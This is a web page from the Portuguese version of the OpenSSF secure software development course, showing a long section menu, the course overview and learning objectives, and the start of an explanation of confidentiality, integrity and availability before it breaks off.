<span class=md-ellipsis> Entradas especiais: Padrões seguros e inicialização segura </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#considere-a-disponibilidade-em-todas-as-entradas-introducao> <span class=md-ellipsis> Considere a disponibilidade em todas as entradas: Introdução </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#tente-eliminar-entradas-facilmente-amplificadas> <span class=md-ellipsis> Tente eliminar entradas facilmente amplificadas </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#prefira-dados-confiaveis-trate-dados-nao-confiaveis-como-perigosos> <span class=md-ellipsis> Prefira dados confiáveis. Trate dados não confiáveis ​​como perigosos. </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#evite-credenciais-padrao-e-codificadas> <span class=md-ellipsis> Evite credenciais padrão e codificadas </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#evite-credenciais-padrao> <span class=md-ellipsis> Evite credenciais padrão </span> </a> <nav aria-label="Evite credenciais padrão" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#evite-credenciais-codificadas-em-vez-disso-armazene-as-com-seguranca> <span class=md-ellipsis> Evite credenciais codificadas. Em vez disso, armazene-as com segurança. </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#evite-conversao-ou-conversao-incorreta> <span class=md-ellipsis> Evite conversão ou conversão incorreta </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#seguranca-da-memoria> <span class=md-ellipsis> Segurança da Memória </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#leiturasgravacoes-fora-dos-limites-e-estouro-de-buffer-i> <span class=md-ellipsis> Leituras/gravações fora dos limites e estouro de buffer I </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#leiturasgravacoes-fora-dos-limites-e-estouro-de-buffer-ii> <span class=md-ellipsis> Leituras/gravações fora dos limites e estouro de buffer II </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#solucoes-para-leituras-e-gravacoes-fora-dos-limites> <span class=md-ellipsis> Soluções para leituras e gravações fora dos limites </span> </a> <nav aria-label="Soluções para leituras e gravações fora dos limites" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#liberacao-dupla-uso-apos-liberacao-e-liberacao-ausente> <span class=md-ellipsis> Liberação dupla, uso após liberação e liberação ausente </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#evite-comportamento-indefinido> <span class=md-ellipsis> Evite comportamento indefinido </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#evite-estouro-wraparound-e-underflow-de-inteiros> <span class=md-ellipsis> Evite estouro, wraparound e underflow de inteiros </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#introducao-aos-programas-de-chamada-segura-i> <span class=md-ellipsis> Introdução aos programas de chamada segura I </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#introducao-aos-programas-de-chamada-segura-ii> <span class=md-ellipsis> Introdução aos Programas de Chamada Segura II </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#vulnerabilidade-de-injecao-de-sql> <span class=md-ellipsis> Vulnerabilidade de injeção de SQL </span> </a> <nav aria-label="Vulnerabilidade de injeção de SQL" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#injecao-de-sql-instrucoes-parametrizadas> <span class=md-ellipsis> Injeção de SQL: Instruções Parametrizadas </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#vantagens-das-instrucoes-parametrizadaspreparadas> <span class=md-ellipsis> Vantagens das instruções parametrizadas/preparadas </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#exemplo-instrucoes-preparadas-em-java> <span class=md-ellipsis> Exemplo: Instruções preparadas em Java </span> </a> <nav aria-label="Exemplo: Instruções preparadas em Java" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#exemplos-instrucoes-parametrizadas-e-preparadas-em-algumas-outras-linguagens> <span class=md-ellipsis> Exemplos: Instruções parametrizadas e preparadas em algumas outras linguagens </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#injecao-de-sql-lado-do-sgbd-servidor-vs-lado-da-aplicacao-cliente> <span class=md-ellipsis> Injeção de SQL: Lado do SGBD (Servidor) vs. Lado da Aplicação (Cliente) </span> </a> <nav aria-label="Injeção de SQL: Lado do SGBD (Servidor) vs. Lado da Aplicação (Cliente)" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#injecao-de-sql-alternativas-para-instrucoes-parametrizadas-procedimentos-armazenados> <span class=md-ellipsis> Injeção de SQL: Alternativas para Instruções Parametrizadas - Procedimentos Armazenados </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#quando-instrucoes-parametrizadas-nao-funcionam> <span class=md-ellipsis> Quando instruções parametrizadas não funcionam </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#outras-abordagens-para-combater-a-injecao-de-sql> <span class=md-ellipsis> Outras abordagens para combater a injeção de SQL </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#injecao-de-comando-shell-do-so> <span class=md-ellipsis> Injeção de Comando (Shell) do SO </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#outros-ataques-de-injecao> <span class=md-ellipsis> Outros ataques de injeção </span> </a> <nav aria-label="Outros ataques de injeção" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#nomes-de-arquivos> <span class=md-ellipsis> Nomes de arquivos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#caminho-transversal> <span class=md-ellipsis> Caminho Transversal </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#nomes-de-caminho-do-windows> <span class=md-ellipsis> Nomes de caminho do Windows </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#nomes-de-caminho-unixlinux> <span class=md-ellipsis> Nomes de caminho Unix/Linux </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#manipulacao-de-arquivos-incluindo-acompanhamento-de-links> <span class=md-ellipsis> Manipulação de arquivos (incluindo acompanhamento de links) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#chamar-apis-para-programas-e-verificar-o-que-e-retornado> <span class=md-ellipsis> Chamar APIs para programas e verificar o que é retornado </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#lidando-com-erros> <span class=md-ellipsis> Lidando com Erros </span> </a> <nav aria-label="Lidando com Erros" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#codigos-de-retorno> <span class=md-ellipsis> Códigos de retorno </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#excecoes> <span class=md-ellipsis> Exceções </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#outras-abordagens-para-tratamento-de-erros> <span class=md-ellipsis> Outras abordagens para tratamento de erros </span> </a> <nav aria-label="Outras abordagens para tratamento de erros" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#conclusao-sobre-tratamento-de-erros> <span class=md-ellipsis> Conclusão sobre tratamento de erros </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#registro> <span class=md-ellipsis> Registro </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#codigo-de-depuracao-e-assercao-codigo-de-depuracao> <span class=md-ellipsis> Código de Depuração e Asserção: Código de Depuração </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#depuracao-e-codigo-de-assercao-assercoes> <span class=md-ellipsis> Depuração e código de asserção: Asserções </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#combatendo-ataques-de-negacao-de-servico-dos> <span class=md-ellipsis> Combatendo ataques de negação de serviço (DoS) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#introducao-ao-envio-de-saida> <span class=md-ellipsis> Introdução ao Envio de Saída </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#combatendo-cross-site-scripting-o-problema-xss> <span class=md-ellipsis> Combatendo Cross-Site Scripting: O Problema XSS </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#a-solucao-xss-saida-de-escape> <span class=md-ellipsis> A solução XSS: Saída de escape </span> </a> <nav aria-label="A solução XSS: Saída de escape" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#quando-voce-precisa-permitir-dados-nao-confiaveis-sem-escape> <span class=md-ellipsis> Quando você precisa permitir dados não confiáveis ​​sem escape </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#urls> <span class=md-ellipsis> URLs </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#alternativas-xss> <span class=md-ellipsis> Alternativas XSS </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#politica-de-seguranca-de-conteudo-csp> <span class=md-ellipsis> Política de Segurança de Conteúdo (CSP) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#outros-cabecalhos-de-protecao-http> <span class=md-ellipsis> Outros cabeçalhos de proteção HTTP </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#cookies-e-sessoes-de-login> <span class=md-ellipsis> Cookies e sessões de login </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#atributos-de-cookies> <span class=md-ellipsis> Atributos de cookies </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#cookies-em-contexto> <span class=md-ellipsis> Cookies em Contexto </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#cookies-e-sessoes-de-login_1> <span class=md-ellipsis> Cookies e Sessões de Login </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#csrf-xsrf> <span class=md-ellipsis> CSRF / XSRF </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#abrir-redirecionamentos-e-encaminhamentos> <span class=md-ellipsis> Abrir redirecionamentos e encaminhamentos </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#alvo-html-e-janela-javascriptopen> <span class=md-ellipsis> Alvo HTML e janela JavaScript.open() </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#uso-de-urls-inadequadamente-verificadasfalsificacao-de-solicitacao-do-lado-do-servidor-ssrf> <span class=md-ellipsis> Uso de URLs inadequadamente verificadas/falsificação de solicitação do lado do servidor (SSRF) </span> </a> <nav aria-label="Uso de URLs inadequadamente verificadas/falsificação de solicitação do lado do servidor (SSRF)" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#politica-de-mesma-origem-e-compartilhamento-de-recursos-de-origem-cruzada-cors-cross-origin-resource-sharing> <span class=md-ellipsis> Política de Mesma Origem e Compartilhamento de Recursos de Origem Cruzada (CORS -Cross-Origin Resource Sharing) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#strings-de-formato-e-modelos> <span class=md-ellipsis> Strings de formato e modelos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#minimize-o-feedbackexposicao-de-informacoes> <span class=md-ellipsis> Minimize o feedback/exposição de informações </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#evite-armazenar-em-cache-informacoes-confidenciais> <span class=md-ellipsis> Evite armazenar em cache informações confidenciais </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#ataques-de-canal-lateral> <span class=md-ellipsis> Ataques de canal lateral </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#analise-estatica-e-dinamica> <span class=md-ellipsis> Análise Estática e Dinamica </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#relatorios-verdadeiros-e-falsos> <span class=md-ellipsis> Relatórios verdadeiros e falsos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#aplicando-ferramentas> <span class=md-ellipsis> Aplicando ferramentas </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#visao-geral-da-analise-estatica> <span class=md-ellipsis> Visão geral da análise estática </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#revisao-humana> <span class=md-ellipsis> Revisão Humana </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#ferramentas-genericas-de-deteccao-de-bugs-ferramentas-de-qualidade-avisos-do-compilador-e-ferramentas-de-verificacao-de-tipo> <span class=md-ellipsis> Ferramentas genéricas de detecção de bugs: ferramentas de qualidade, avisos do compilador e ferramentas de verificação de tipo </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#scanners-de-codigo-de-segurancaferramentas-de-teste-de-seguranca-de-aplicativos-estaticos-sast> <span class=md-ellipsis> Scanners de código de segurança/Ferramentas de teste de segurança de aplicativos estáticos (SAST) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#scanners-de-codigo-de-seguranca-especializadosferramentas-sast> <span class=md-ellipsis> Scanners de código de segurança especializados/ferramentas SAST </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#outras-ferramentas-de-analise-estatica> <span class=md-ellipsis> Outras ferramentas de análise estática </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#analise-de-composicao-de-software-scaanalise-de-dependencia> <span class=md-ellipsis> Análise de Composição de Software (SCA)/Análise de Dependência </span> </a> <nav aria-label="Análise de Composição de Software (SCA)/Análise de Dependência" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#necessidade-de-sca> <span class=md-ellipsis> Necessidade de SCA </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#preparando-se-para-o-inevitavel-vulnerabilidades-em-suas-dependencias> <span class=md-ellipsis> Preparando-se para o inevitável: vulnerabilidades em suas dependências </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#visao-geral-e-limitacoes-da-analise-dinamica> <span class=md-ellipsis> Visão geral e limitações da análise dinâmica </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#testes-tradicionais> <span class=md-ellipsis> Testes tradicionais </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#testes-tradicionais-de-seguranca> <span class=md-ellipsis> Testes tradicionais de segurança </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#cobertura-de-teste> <span class=md-ellipsis> Cobertura de teste </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#teste-de-fuzz-fuzzing-vs-teste-tradicional> <span class=md-ellipsis> Teste de Fuzz: Fuzzing vs Teste Tradicional </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#usando-fuzzers-efetivamente> <span class=md-ellipsis> Usando Fuzzers Efetivamente </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#fuzzers-guiados-por-cobertura> <span class=md-ellipsis> Fuzzers guiados por cobertura </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#taxa-de-retorno-decrescente> <span class=md-ellipsis> Taxa de retorno decrescente </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#projetos-de-fuzzing> <span class=md-ellipsis> Projetos de Fuzzing </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#fuzzing-e-scanners-de-aplicativos-da-web> <span class=md-ellipsis> Fuzzing e scanners de aplicativos da Web </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#scanners-de-aplicativos-da-web> <span class=md-ellipsis> Scanners de aplicativos da Web </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#combinando-abordagens-de-verificacao> <span class=md-ellipsis> Combinando abordagens de verificação </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#introducao-a-modelagem-de-ameacas> <span class=md-ellipsis> Introdução à Modelagem de Ameaças </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#stride> <span class=md-ellipsis> STRIDE </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#introducao-a-criptografia> <span class=md-ellipsis> Introdução à Criptografia </span> </a> <nav aria-label="Introdução à Criptografia" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#algoritmos-de-criptografia-de-chave-compartilhadasimetrica> <span class=md-ellipsis> Algoritmos de criptografia de chave compartilhada/simétrica </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#escolhendo-um-algoritmo-de-chave-simetrica> <span class=md-ellipsis> Escolhendo um algoritmo de chave simétrica </span> </a> <nav aria-label="Escolhendo um algoritmo de chave simétrica" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#escolhendo-um-modo> <span class=md-ellipsis> Escolhendo um modo </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#hashes-criptograficos-impressoes-digitais> <span class=md-ellipsis> Hashes Criptográficos (Impressões Digitais) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#criptografia-de-chave-publica-assimetrica> <span class=md-ellipsis> Criptografia de chave pública (assimétrica) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#gerador-de-numeros-pseudoaleatorios-criptograficamente-seguro-csprng> <span class=md-ellipsis> Gerador de números pseudoaleatórios criptograficamente seguro (CSPRNG) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#armazenando-senhas> <span class=md-ellipsis> Armazenando senhas </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#seguranca-da-camada-de-transporte-tls> <span class=md-ellipsis> Segurança da Camada de Transporte (TLS) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#validacao-de-certificado> <span class=md-ellipsis> Validação de Certificado </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#ciphersuites> <span class=md-ellipsis> Ciphersuites </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#obtendo-conselhos-criptograficos> <span class=md-ellipsis> Obtendo conselhos criptográficos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#algoritmos-de-tempo-constante> <span class=md-ellipsis> Algoritmos de Tempo Constante </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#minimizar-o-tempo-em-que-as-chavesdados-descriptografados-existem> <span class=md-ellipsis> Minimizar o tempo em que as chaves/dados descriptografados existem </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#computacao-quantica> <span class=md-ellipsis> Computação Quântica </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#a-humildade-e-importante-na-criptografia> <span class=md-ellipsis> A humildade é importante na criptografia </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#equipes-de-resposta-a-incidentes-de-seguranca-de-produtos-psirts> <span class=md-ellipsis> Equipes de Resposta a Incidentes de Segurança de Produtos (PSIRTs) </span> </a> <nav aria-label="Equipes de Resposta a Incidentes de Segurança de Produtos (PSIRTs)" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#declare-publicamente-como-enviar-relatorios-de-vulnerabilidade> <span class=md-ellipsis> Declare publicamente como enviar relatórios de vulnerabilidade </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#monitorar-vulnerabilidades-incluindo-dependencias-vulneraveis> <span class=md-ellipsis> Monitorar vulnerabilidades, incluindo dependências vulneráveis </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#considere-criar-um-programa-de-recompensa-por-bugs> <span class=md-ellipsis> Considere criar um programa de recompensa por bugs </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#responda-e-corrija-a-vulnerabilidade-em-tempo-habil> <span class=md-ellipsis> Responda e corrija a vulnerabilidade em tempo hábil </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#corrigindo-a-vulnerabilidade> <span class=md-ellipsis> Corrigindo a vulnerabilidade </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#limitacao-de-divulgacao-e-o-protocolo-de-semaforo-first-tlp> <span class=md-ellipsis> Limitação de Divulgação e o Protocolo de Semáforo FIRST (TLP) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#obtenha-um-cve-e-calcule-cvss> <span class=md-ellipsis> Obtenha um CVE e calcule CVSS </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#divulgue-a-atualizacao-e-conte-ao-mundo> <span class=md-ellipsis> Divulgue a atualização e conte ao mundo </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#enviando-relatorios-de-vulnerabilidade-para-outras-pessoas> <span class=md-ellipsis> Enviando relatórios de vulnerabilidade para outras pessoas </span> </a> <nav aria-label="Enviando relatórios de vulnerabilidade para outras pessoas" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#modelos-de-relatorios> <span class=md-ellipsis> Modelos de Relatórios </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#mais-informacoes> <span class=md-ellipsis> Mais informações </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#casos-de-garantia> <span class=md-ellipsis> Casos de Garantia </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#fortalecer-o-ambiente-de-desenvolvimento-incluindo-pipeline-de-construcao-e-cicd-e-o-ambiente-de-distribuicao> <span class=md-ellipsis> Fortalecer o ambiente de desenvolvimento (incluindo pipeline de construção e CI/CD) e o ambiente de distribuição </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#distribuicao-implantacaoimplantacao-operacoes-e-descarte> <span class=md-ellipsis> Distribuição, Implantação/Implantação, Operações e Descarte </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#inteligencia-artificial-ia-aprendizado-de-maquina-ml-e-seguranca> <span class=md-ellipsis> Inteligência Artificial (IA), Aprendizado de Máquina (ML) e Segurança </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#metodos-formais> <span class=md-ellipsis> Métodos formais </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#niveis-de-metodos-formais> <span class=md-ellipsis> Níveis de Métodos Formais </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#como-a-matematica-pode-ser-aplicada-quantificadores> <span class=md-ellipsis> Como a matemática pode ser aplicada? Quantificadores </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#declaracoes-matematicas-versus-o-mundo-real> <span class=md-ellipsis> Declarações matemáticas versus o mundo real </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#ferramentas-de-metodos-formais> <span class=md-ellipsis> Ferramentas de Métodos Formais </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#metodos-formais-e-o-futuro> <span class=md-ellipsis> Métodos formais e o futuro </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#owasp-top-10> <span class=md-ellipsis> OWASP Top 10 </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#cwe-top-25> <span class=md-ellipsis> CWE Top 25 </span> </a> <nav aria-label="CWE Top 25" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#on-the-cusp> <span class=md-ellipsis> On the Cusp </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#conclusoes> <span class=md-ellipsis> Conclusões </span> </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h2 id=visao-geral-do-curso-objetivos-de-aprendizagem-e-cronograma>Visão geral do curso, objetivos de aprendizagem e cronograma<a class=headerlink href=#visao-geral-do-curso-objetivos-de-aprendizagem-e-cronograma title="Permanent link">¶</a></h2> <p>Quase todos os softwares estão sob ataque hoje em dia, e muitas organizações não estão preparadas para se defender. Este curso, desenvolvido pela Open Source Security Foundation (OpenSSF), um projeto da Linux Foundation, é voltado para desenvolvedores de software, profissionais de DevOps, engenheiros de software, desenvolvedores de aplicações web e outros interessados ​​em aprender como desenvolver software seguro, com foco em medidas práticas que podem ser tomadas, mesmo com recursos limitados, para melhorar a segurança da informação.</p> <p>O curso permite que desenvolvedores de software criem e mantenham sistemas muito mais difíceis de atacar com sucesso, reduzam os danos quando os ataques são bem-sucedidos e acelerem a resposta para que quaisquer vulnerabilidades latentes possam ser rapidamente reparadas.</p> <p>As melhores práticas abordadas no curso se aplicam a todos os desenvolvedores de software e incluem informações especialmente úteis para aqueles que usam ou desenvolvem software de código aberto.</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Requisitos, Design e Reutilização foi elaborada para fornecer uma visão geral dos princípios básicos de segurança, incluindo requisitos de segurança do sistema, princípios de design seguro e práticas recomendadas, além de como selecionar e reutilizar softwares com segurança para seus sistemas.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Implementação abrange as etapas práticas que os desenvolvedores de software podem tomar, mesmo que tenham recursos limitados, para implementar software seguro.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Verificação e Tópicos Mais Especializados foi elaborada para mostrar como verificar a segurança do software e lhe dá a oportunidade de se aprofundar nos conceitos básicos da aplicação de modelos de ameaças e criptografia.</li> </ul> <p>Os cursos de treinamento incluídos neste programa concentram-se em etapas práticas que você (como desenvolvedor) pode adotar para combater os tipos mais comuns de ataques. Não se concentram em como atacar sistemas, como os ataques funcionam ou em pesquisas de longo prazo.</p> <p>O desenvolvimento moderno de software depende de software de código aberto, que agora está disseminado em data centers, dispositivos de consumo e serviços.</p> <p>É importante que os responsáveis ​​pela segurança cibernética sejam capazes de compreender e verificar a segurança da cadeia de contribuidores e dependências do código aberto. Graças ao envolvimento do OpenSSF, uma colaboração intersetorial que reúne líderes para aprimorar a segurança do software de código aberto por meio da construção de uma comunidade mais ampla, iniciativas direcionadas e melhores práticas, este programa fornece dicas específicas sobre como usar e desenvolver código aberto com segurança.</p> <p>Ao final deste curso, você deverá ser capaz de:</p> <ul> <li>Noções básicas de segurança: aprenda sobre gerenciamento de riscos, a tríade “CIA” e requisitos.</li> <li>Princípios de design seguro: discuta princípios como “privilégio mínimo” e como aplicá-los.</li> <li>Avaliação da cadeia de suprimentos: aprenda dicas sobre como escolher pacotes para reutilizar e como reutilizá-los para que você possa ser alertado rapidamente e atualizar o software.</li> <li>Implementação: Aprenda a implementar softwares mais seguros (como fazer validação de entrada, processar dados com segurança, chamar outros programas e enviar saída) e abordagens mais especializadas (como noções básicas de criptografia e tratamento de problemas).</li> <li>Verificação de segurança: aprenda a examinar software, incluir alguns tipos principais de ferramentas e como aplicá-los na integração contínua (CI).</li> <li>Fielding: Aprenda a implantar e operar software seguro, lidar com relatórios de vulnerabilidades e como atualizar rapidamente quando componentes reutilizados tiverem vulnerabilidades publicamente conhecidas.</li> <li>Aprenda a usar e desenvolver software de código aberto com segurança.</li> </ul> <p>Diariamente, surgem notícias sobre invasões de sistemas de computadores, muitas vezes por meio de diversas vulnerabilidades no software. Softwares inseguros podem:</p> <ul> <li>Divulgar informações privadas/secretas (também conhecido como <em>“perder a confidencialidade”</em> )</li> <li>Perder ou corromper informações (também conhecido como <em>“perder integridade”</em> )</li> <li>Perder serviço (também conhecido como <em>“perder disponibilidade”</em> ).</li> </ul> <p>Mas os problemas não param por aí. Qualquer um deles pode causar perdas <em>reais</em>. Podem custar dinheiro, tempo, confiança e até vidas.</p> <p>No entanto, muitas vezes, os desenvolvedores nunca são informados sobre como desenvolver software seguro. Devemos <em>esperar</em> que desenvolvedores que nunca são informados sobre como fazer algo tenham dificuldades para fazê-lo.</p> <p>Este curso se concentra em ajudar você a entender como desenvolver software seguro na prática. Por <em>software seguro,</em> queremos dizer software:</p> <ul> <li>que é muito mais difícil para os invasores explorarem,</li> <li>que limita os danos se uma exploração for bem-sucedida e</li> <li>onde vulnerabilidades podem ser corrigidas e explorações parcialmente recuperadas de forma relativamente rápida.</li> </ul> <h2 id=parte-1-introducao-e-objetivos-de-aprendizagem>Parte 1 Introdução e Objetivos de Aprendizagem<a class=headerlink href=#parte-1-introducao-e-objetivos-de-aprendizagem title="Permanent link">¶</a></h2> <p>Esta seção aborda os fundamentos da segurança, como o que o gerenciamento de riscos realmente significa. Aborda como considerar a segurança como parte dos requisitos de um sistema e quais potenciais requisitos de segurança você pode considerar. Em seguida, foca em como projetar software para ser seguro, incluindo vários princípios de design seguro que ajudarão você a evitar designs ruins e adotar designs bons. Também considera como proteger sua cadeia de suprimentos de software, ou seja, como selecionar e adquirir software reutilizado (incluindo software de código aberto) com mais segurança para aumentar a segurança.</p> <p>Ao final desta seção, você deverá ser capaz de:</p> <ul> <li>Analise os princípios básicos de segurança, incluindo gerenciamento de riscos, a tríade "CIA" e requisitos.</li> <li>Discuta princípios de design seguro, como "privilégio mínimo", e como aplicá-los.</li> <li>Entenda a avaliação da cadeia de suprimentos, incluindo dicas sobre como escolher embalagens para reutilização e como reutilizá-las para que você possa ser alertado e atualizado rapidamente quando necessário</li> </ul> <h2 id=o-que-significa-seguranca>O que significa "segurança"?<a class=headerlink href=#o-que-significa-seguranca title="Permanent link">¶</a></h2> <p>Cada software tem seus próprios requisitos de segurança específicos, mas muitas pessoas dividem os requisitos de segurança em três objetivos amplos: Confidencialidade, Integridade e Disponibilidade:</p> <ul> <li><strong>Confidencialidade</strong> "Ler sem autorização" - os usuários só podem ler as informações que estão autorizados a ler.</li> <li><strong>Integridade</strong> "Sem modificação não autorizada (gravação ou exclusão)" - os usuários só podem modificar as informações que estão autorizados a modificar; modificação inclui adições, alterações e exclusões.</li> <li><strong>Disponibilidade</strong> "Continua funcionando mesmo sob ataque" - o software continua funcionando mesmo sob ataque. Um ataque de Negação de Serviço (DoS) é um ataque que tenta fazer com que o 